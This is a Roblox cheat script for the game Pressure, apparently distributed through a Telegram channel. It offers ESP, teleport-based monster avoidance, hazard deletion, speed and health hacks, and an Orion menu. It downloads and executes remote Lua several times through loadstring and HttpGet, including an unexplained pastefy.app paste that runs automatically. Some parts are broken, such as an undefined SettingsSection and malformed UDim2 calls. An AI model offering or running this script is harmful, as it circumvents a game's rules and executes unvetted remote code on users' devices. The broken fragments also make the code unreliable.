--u can find this script in telegram chanel.@KrutoyCapybarin
local p = Instance.new("Part") --You CFrame equals CFrame of this part while angler is coming
p.Position = Vector3.new(-34, 1494, -1120)
p.Size = Vector3.new(100, 10, 100)--your CFrame while angler is coming
p.Transparency = 0--part is invisible
p.Anchored = true  --part is anchored,cant drop to void
p.Parent = workspace --part will be added in workspace
local sp = 45 --Player's speed
local key = {}
local monster = {}
local trickster ={}
local locker = {}
local OrionLib = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Orion/main/source'))()
local Window = OrionLib:MakeWindow({
	Name = " Capy Pressure Script",--dont change it,please :3
	HidePremium = false,
	SaveConfig = true,
	ConfigFolder = "PressureScript"
})
local Tab = Window:MakeTab({
	Name = "Main",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
Tab:AddParagraph("t.me/KrutoyCapybarin")
Tab:AddParagraph("My Telegram chanel,join for more scripts! ")
local Lobby = Window:MakeTab({
	Name = "Lobby",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
Tab:AddSlider({
	Name = "Set Walkspeed(PC only)",
	Min = 0,
	Max = 100,
	Default = 45, --player's walksped
	Color = Color3.fromRGB(255,255,255),
	Increment = 1,
	ValueName = "sp", --at end of the script,Player's walkspeed will be equals sp.Value
	Callback = function(Value)
		sp = Value
	end    
})
Tab:AddButton({
	Name = "Fullbright", --u can see in dark rooms
	Callback = function()
		local lighting = game.Lighting
		lighting.Brightness = 2
		lighting.ClockTime = 14
		lighting.FogEnd = 100000
		lighting.GlobalShadows = false
		lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
	end    
})
Tab:AddToggle({
	Name = "no proxmitiyprompt duration", --you will open new door in 0.1 seconds.U dont need to hold E.
	Default = true,
	Flag = "asdas",
	Save = true
})
Tab:AddToggle({
	Name = "Notify Monster",--if monster has spawned, you will get alert on your screen
	Default = true,
	Flag = "NotifyMonster",
	Save = true
})
Tab:AddToggle({
	Name = "Avoid any Monster (turn off it The Ridge)",
	Default = true,
	Flag = "avoids",
	Save = true
})
Tab:AddToggle({
	Name = "No Eyefestation", -- that green "shark" will will destroyed for u
	Default = true,
	Flag = "noeyefestation",
	Save = true
})
Tab:AddToggle({
	Name = "No Steams",
	Default = true,
	Flag = "steaming",
	Save = true
})
Tab:AddToggle({
	Name = "Key ESP",
	Default = true,
	Flag = "keys",
	Save = true,
	Callback = function(Value)
		for _, cham in pairs(key) do
			cham.Enabled = Value
		end
	end    
})
Tab:AddToggle({
	Name = "Monster ESP",
	Default = true,
	Flag = "monsters",
	Save = true,
	Callback = function(Value)
		for _, cham in pairs(monster) do
			cham.Enabled = Value
		end
	end    
})
Tab:AddToggle({
	Name = "TricksterRoom ESP", --esp fake doors
	Default = true,
	Flag = "TricksterRoomdanger",
	Save = true,
	Callback = function(Value)
		for _, cham in pairs(trickster) do
			cham.Enabled = Value
		end
	end    
})
Tab:AddToggle({
	Name = "Monster Locker ESP", --esp that fake locker,purple /red/green/yellow monster in hiding spots
	Default = true,
	Flag = "monsterlocker",
	Save = true,
	Callback = function(Value)
		for _, cham in pairs(locker) do
			cham.Enabled = Value
		end
	end    
})
local credits = Window:MakeTab({
	Name = "Credits",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
--now, after credits,starts functions of the buttons
credits:AddParagraph("made by Krutoy Capybarin", "Krutoy suslik and no name guy :D")
credits:AddParagraph("Good luck! :)")
local others = Window:MakeTab({
	Name = "other stuff",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
others:AddButton({
	Name = "Infinity Yield ",
	Callback = function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
	end    
})
others:AddButton({
	Name = "Dex exploler",
	Callback = function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/infyiff/backup/main/dex.lua'))()
	end    
})
local function applykey(inst)
	local text = Instance.new("BillboardGui")
	text.Name = "key"
	text.Adornee = inst
	text.Size = UDim2.new(0, 200, 0, 50)
	text.StudsOffset = Vector3.new(0, 2, 0)
	text.AlwaysOnTop = true
	text.Parent = game.CoreGui
	local label = Instance.new("TextLabel")
	label.Size = UDim2.new(1, 0, 1, 0)
	label.Text = inst.Name
	label.TextColor3 = Color3.new(1, 1, 1)
	label.BackgroundTransparency = 1
	label.TextStrokeTransparency = 0
	label.TextScaled = true
	label.Parent = text
	table.insert(key, text)
end
local function applymos(inst)
	local text = Instance.new("BillboardGui")
	text.Name = "mons"
	text.Adornee = inst
	text.Size = UDim2.new(0, 200, 0, 50)
	text.StudsOffset = Vector3.new(0, 2, 0)
	text.AlwaysOnTop = true
	text.Parent = game.CoreGui
	local label = Instance.new("TextLabel")
	label.Size = UDim2.new(1, 0, 1, 0)
	label.Text = inst.Name
	label.TextColor3 = Color3.new(1, 0, 0)
	label.BackgroundTransparency = 1
	label.TextStrokeTransparency = 0
	label.TextScaled = true
	label.Parent = text
	table.insert(monster, text)
end
local function applylocker(inst)
	local text = Instance.new("BillboardGui")
	text.Name = "locker"
	text.Adornee = inst
	text.Size = UDim2.new(0, 200, 0, 50)
	text.StudsOffset = Vector3.new(0, 2, 0)
	text.AlwaysOnTop = true
	text.Parent = game.CoreGui
	local label = Instance.new("TextLabel")
	label.Size = UDim2.new(1, 0, 1, 0)
	label.Text = "Monster Locker"
	label.TextColor3 = Color3.new(0.5, 0, 0.5)
	label.BackgroundTransparency = 1
	label.TextStrokeTransparency = 0
	label.TextScaled = true
	label.Parent = text
	table.insert(locker, text)
end
local function applytrickster(inst)
	local text = Instance.new("BillboardGui")
	text.Name = "locker"
	text.Adornee = inst
	text.Size = UDim2.new(0, 200, 0, 50)
	text.StudsOffset = Vector3.new(0, 2, 0)
	text.AlwaysOnTop = true
	text.Parent = game.CoreGui
	local label = Instance.new("TextLabel")
	label.Size = UDim2.new(1, 0, 1, 0)
	label.Text = "Do not enter"
	label.TextColor3 = Color3.new(1, 1, 1) 
	label.BackgroundTransparency = 1
	label.TextStrokeTransparency = 0
	label.TextScaled = true
	label.Parent = text
	table.insert(trickster, text)
end
local keycor = coroutine.create(function()
	workspace.Rooms.DescendantAdded:Connect(function(inst)
		if inst:IsA("Model") and inst:GetAttribute("InteractionType") == "KeyCard" then
			applykey(inst)
		end
		if inst:IsA("Model") and inst:GetAttribute("InteractionType") == "InnerKeyCard" then
			applykey(inst)
		end
	end)
end)
coroutine.resume(keycor)
for _, v in ipairs(workspace.Rooms:GetDescendants()) do
	if v:IsA("Model") and v:GetAttribute("InteractionType") == "KeyCard" then
		applykey(v)
	end
	if v:IsA("Model") and v:GetAttribute("InteractionType") == "InnerKeyCard" then
		applykey(v)
	end
end
workspace.ChildAdded:Connect(function(inst)
	local sikibid = {}
	for _, descendant in ipairs(game.ReplicatedStorage.DeathFolder:GetDescendants()) do
		table.insert(sikibid, descendant.Name)
	end
	if table.find(sikibid, inst.Name) then
		if OrionLib.Flags.NotifyMonster.Value then
			OrionLib:MakeNotification({
				Name = "A monster has spawned go hide in the closet",
				Content = "WARNING!!!!!!!!!!!!",
				Image = "rbxassetid://4483345998",
				Time = 10
			})
		end
		if OrionLib.Flags.monsters.Value then
			applymos(inst)
		end
		if OrionLib.Flags.avoids.Value then
			local oldpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			local tp = game:GetService("RunService").Heartbeat:Connect(function()
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(p.Position)
			end)
			inst.Destroying:Wait()
			tp:Disconnect()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(oldpos)
		end
	end
end)

workspace.DescendantAdded:Connect(function(inst)
	if inst.Name == "Eyefestation" and OrionLib.Flags.noeyefestation.Value then
		task.wait(0.1)
		inst:Destroy()
	end
	if inst.Name == "SearchlightsEncounter" and OrionLib.Flags.Searchlights.Value then
		wait(10)
		inst:Destroy()
	end
	if inst:IsA("ProximityPrompt") and OrionLib.Flags.asdas.Value then
		task.wait(0.1)
		inst.HoldDuration = 0
	end
	if inst.Name == "Steams" and OrionLib.Flags.steaming.Value then
		task.wait(0.1)
		inst:Destroy()
	end
	if inst.Name == "MonsterLocker" and OrionLib.Flags.monsterlocker.Value then
		task.wait(0.1)
		applylocker(inst)
	end
	if inst.Name == "TricksterRoom" and OrionLib.Flags.TricksterRoomdanger.Value then
		task.wait(0.1)
		applytrickster(inst)
	end
end)
for _, v in ipairs(workspace:GetDescendants()) do
	if v.Name == "MonsterLocker" and OrionLib.Flags.monsterlocker.Value then
		applylocker(v)
	end
end
game:GetService("RunService").Heartbeat:Connect(function()
	game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = sp
end)
loadstring(game:HttpGet(('https://pastefy.app/M0N30XXG/raw'),true))()

Tab:AddButton({
	Name = "100 HP",
	Callback = function()
		game.Players.LocalPlayer.Character.Humanoid.Health = 100
			end    
})

Tab:AddButton({
	Name = "999 HP (Working)",
	Callback = function()
		game.Players.LocalPlayer.Character.Humanoid.Health = 999
			end    
})

Tab:AddButton({
	Name = "Inf HP",
	Callback = function()
		while wait(5) do
		game.Players.LocalPlayer.Character.Humanoid.Health = 999
		end
			end    
})
SettingsSection:AddButton({
	Name = "Teleport menu to starter position (Middle)",
	Callback = function()
        game.CoreGui.Orion.Frame.Position = UDim2.new({0.5, -307}, {0.5, -172})
  	end    
})
--teleport menu to good mobile pos
SettingsSection:AddButton({
	Name = "Teleport menu to good position (For mobile users)",
	Callback = function()
        game.CoreGui.Orion.Frame.Position = UDim2.new({0.5, -583}, {0.5, -351})
  	end    
})
print("Krutoy Capybarin make this script better,also u can execute old version of the script.Its on my git hub repo in README file.")
print("#CapybarasAreCute :3")
print("Join our Telegram chanels! ⬇️")
print(" t.me/KrutoyCapybarin ")
print("t.me/CapyPhobia")
